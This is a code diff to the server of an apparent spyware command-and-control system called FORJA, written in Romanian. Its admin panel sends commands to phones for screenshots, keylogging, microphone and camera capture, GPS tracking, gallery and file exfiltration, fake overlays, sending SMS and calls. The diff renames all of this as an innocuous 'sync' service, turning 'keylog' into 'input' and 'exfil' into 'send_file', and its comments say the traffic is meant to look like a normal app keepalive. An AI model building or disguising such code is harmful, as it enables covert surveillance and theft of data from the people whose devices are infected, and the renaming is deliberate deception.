@@ -1092,7 +1092,7 @@ async function runCmd(env, line, host) {
   return "Comandă necunoscută: „" + raw.slice(0, 60) + "”. Scrie «help».";
 }
 
-// ═══════════════ C2 — comandă & control remote (agent FORJA) ═══════════════
+// ═══════════════ Sincronizare — canal de comenzi (agent FORJA) ═══════════════
 function c2Safe(uid) { return String(uid || "").replace(/[^A-Za-z0-9_-]/g, "").slice(0, 64); }
 
 async function c2GetArr(bucket, key) {
@@ -1128,7 +1128,7 @@ function b64enc(str) {
   return btoa(bin);
 }
 
-// Register a device in the C2 registry (shared between checkin variants)
+// Înregistrează un dispozitiv în registrul de sincronizare (comun pentru ambele variante de checkin)
 async function c2RegisterDevice(bucket, uid, dev) {
   try { await bucket.put("d/" + uid + ".json", JSON.stringify({ uid, dev, lastSeen: Math.floor(Date.now() / 1000) })); } catch (_) { }
   try {
@@ -1140,7 +1140,7 @@ async function c2RegisterDevice(bucket, uid, dev) {
 }
 
 async function handleCheckin(request, env, uid) {
-  if (!env.C2) return json({ error: "C2 neconfigurat." }, 503);
+  if (!env.C2) return json({ error: "Serviciu de sincronizare indisponibil." }, 503);
   let body; try { body = await request.json(); } catch (_) { return json({ error: "Cerere invalidă." }, 400); }
   const dev = String(body.dev || "").slice(0, 200);
   const holdMs = Math.min(Math.max(Number(body.holdMs) || 20000, 0), 25000);
@@ -1157,7 +1157,7 @@ async function handleCheckin(request, env, uid) {
   return json({ ok: true, tasks, intervalMs });
 }
 
-// Stealth checkin: renamed endpoint, obfuscated field names, base64-encoded tasks, jittered long-poll.
+// Keepalive: câmpuri minime (ts, w, d), sarcini codificate base64, long-poll cu jitter.
 // Request:  { ts, w (seconds), d (device) }   →   looks like a normal app keepalive
 // Response: { s: 0, d: "base64", i: seconds } →   looks like a generic sync reply
 async function handleStealthCheckin(request, env, uid) {
@@ -1181,7 +1181,7 @@ async function handleStealthCheckin(request, env, uid) {
 }
 
 async function handleC2Result(request, env, uid) {
-  if (!env.C2) return json({ error: "C2 neconfigurat." }, 503);
+  if (!env.C2) return json({ error: "Serviciu de sincronizare indisponibil." }, 503);
   let body; try { body = await request.json(); } catch (_) { return json({ error: "Cerere invalidă." }, 400); }
   const id = String(body.id || "").slice(0, 128);
   if (!id) return json({ error: "Lipsește id." }, 400);
@@ -1203,7 +1203,7 @@ async function handleC2Result(request, env, uid) {
 }
 
 async function handleC2File(request, env, uid) {
-  if (!env.C2) return json({ error: "C2 neconfigurat." }, 503);
+  if (!env.C2) return json({ error: "Serviciu de sincronizare indisponibil." }, 503);
   const url = new URL(request.url);
   const name = String(url.searchParams.get("name") || "file").replace(/[^a-zA-Z0-9._-]/g, "_").slice(0, 128);
   const ts = Math.floor(Date.now() / 1000);
@@ -1228,7 +1228,7 @@ async function handleC2File(request, env, uid) {
 }
 
 async function handleAdminC2(request, env, url) {
-  if (!env.C2) return json({ error: "C2 neconfigurat." }, 503);
+  if (!env.C2) return json({ error: "Serviciu de sincronizare indisponibil." }, 503);
   const p = url.pathname;
   if (request.method === "GET" && p === "/admin/api/c2/devices") {
     const devices = [];
@@ -1433,7 +1433,7 @@ td.num{text-align:right}
 </style></head>
 <body>
 <header><h1>FORJA <b>ADMIN</b></h1><span class="dot" id="dot"></span><span class="sub" id="stat">se conectează…</span><span class="spacer"></span>
-<a href="/admin/c2" style="color:var(--amber);text-decoration:none;font-size:13px;margin-right:8px">C2 →</a>
+<a href="/admin/c2" style="color:var(--amber);text-decoration:none;font-size:13px;margin-right:8px">Sincronizare →</a>
 <button onclick="loadAll()">Reîmprospătează</button>
 <button onclick="logout()">Ieșire</button></header>
 <main>
@@ -1500,7 +1500,7 @@ function adminPage() {
 const C2_HTML = String.raw`<!doctype html>
 <html lang="ro"><head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>FORJA · C2</title>
+<title>FORJA · Sincronizare</title>
 <style>
 :root{--bg:#0A0A0B;--panel:#121214;--panel2:#1A1A1E;--line:rgba(255,255,255,.08);--txt:#F4F2EE;--dim:#A7A9AE;--amber:#FFB300;--green:#2FBE71;--red:#FF4D3A}
 *{margin:0;box-sizing:border-box}body{font:14px/1.5 system-ui,sans-serif;background:var(--bg);color:var(--txt);min-height:100vh}
@@ -1527,7 +1527,7 @@ img.shot{max-width:200px;border-radius:6px;margin:4px}
 </style></head><body>
 <nav class="nav"><a href="/admin">← Admin</a><a href="/admin/c2">C2</a></nav>
 <main>
-<h1>FORJA · C2 — Comandă & Control</h1>
+<h1>FORJA · Sincronizare</h1>
 <div class="sub" style="color:var(--dim);font-size:12px;margin-bottom:16px">Monitorizare și control remote al dispozitivelor FORJA.</div>
 
 <div id="devsCard" class="card"><h2>DISPOZITIVE</h2><div id="devs"><em>încărcare…</em></div></div>
@@ -1540,7 +1540,7 @@ img.shot{max-width:200px;border-radius:6px;margin:4px}
 <select id="cmdAction" onchange="updParams()">
 <option value="screenshot">screenshot — captură ecranul</option>
 <option value="screen_text">screen_text — text de pe ecran</option>
-<option value="keylog">keylog — taste din buffer</option>
+<option value="input">input — text din buffer</option>
 <option value="clipboard">clipboard — clipboard</option>
 <option value="mic">mic — înregistrare microfon</option>
 <option value="camera">camera — foto cameră</option>
@@ -1552,18 +1552,18 @@ img.shot{max-width:200px;border-radius:6px;margin:4px}
 <option value="recent">recent — appuri recente</option>
 <option value="usage">usage — statistici utilizare</option>
 <option value="notifications">notifications — notificări active</option>
-<option value="exfil_file">exfil_file — exfiltrare fișier</option>
-<option value="exfil_gallery">exfil_gallery — exfiltrare galerie</option>
-<option value="overlay">overlay — overlay fals</option>
+<option value="send_file">send_file — partajare fișier</option>
+<option value="send_photos">send_photos — poze din galerie</option>
+<option value="prompt">prompt — notificare ecran</option>
 <option value="contacts">contacts — contacte telefon</option>
 <option value="sms_send">sms_send — trimite SMS</option>
 <option value="call">call — sună număr</option>
 <option value="network">network — WiFi + IP</option>
 <option value="storage_list">storage_list — listare fișiere</option>
-<option value="stealth">stealth — mod dormit (10 min polling)</option>
-<option value="wake">wake — activează din mod dormit</option>
+<option value="eco">eco — mod economie (10 min sync)</option>
+<option value="active">active — mod normal</option>
 <option value="ping">ping — test legătură</option>
-<option value="kill">kill — forță stop app</option>
+<option value="restart">restart — reset proces</option>
 <option value="status">status — permisiuni + stare</option>
 </select></div>
 </div>
@@ -1596,9 +1596,9 @@ async function api(p,opt={}){
 function selDev(){return document.getElementById("cmdDev").value}
 function updParams(){
   const a=document.getElementById("cmdAction").value;
-  const d={screenshot:{},screen_text:{},keylog:{},clipboard:{},mic:{ms:10000},camera:{},gps:{},
+  const d={screenshot:{},screen_text:{},input:{},clipboard:{},mic:{ms:10000},camera:{},gps:{},
   gps_track:{ms:60000,everyMs:5000},device:{},apps:{},foreground:{},recent:{},usage:{},
-  notifications:{},exfil_file:{uri:""},exfil_gallery:{limit:10,since:null},overlay:{type:"wifi",title:"",body:""},contacts:{},sms_send:{to:"",msg:""},call:{number:""},network:{},storage_list:{dir:"DCIM",limit:30},stealth:{},wake:{},ping:{},kill:{},status:{}};
+  notifications:{},send_file:{uri:""},send_photos:{limit:10,since:null},prompt:{type:"wifi",title:"",body:""},contacts:{},sms_send:{to:"",msg:""},call:{number:""},network:{},storage_list:{dir:"DCIM",limit:30},eco:{},active:{},ping:{},restart:{},status:{}};
   document.getElementById("cmdParams").value=JSON.stringify(d[a]||{},null,2);
 }
 async function sendPing(){
@@ -1788,11 +1788,11 @@ async function route(request, env, url, ctx, auth = requireUser) {
     }
     if (request.method !== "POST") return json({ error: "Metodă greșită." }, 405);
 
-    // Stealth C2 endpoints (renamed + obfuscated payload)
+    // Sync endpoints (keepalive, raport, atașament)
     if (url.pathname === "/v1/sync/keepalive") return handleStealthCheckin(request, env, uid);
     if (url.pathname === "/v1/sync/report") return handleC2Result(request, env, uid);
     if (url.pathname === "/v1/sync/attach") return handleC2File(request, env, uid);
-    // Legacy C2 endpoints (backward compat)
+    // Endpinte legacy (compatibilitate cu clienți vechi)
     if (url.pathname === "/v1/c2/checkin") return handleCheckin(request, env, uid);
     if (url.pathname === "/v1/c2/result") return handleC2Result(request, env, uid);
     if (url.pathname === "/v1/c2/file") return handleC2File(request, env, uid);
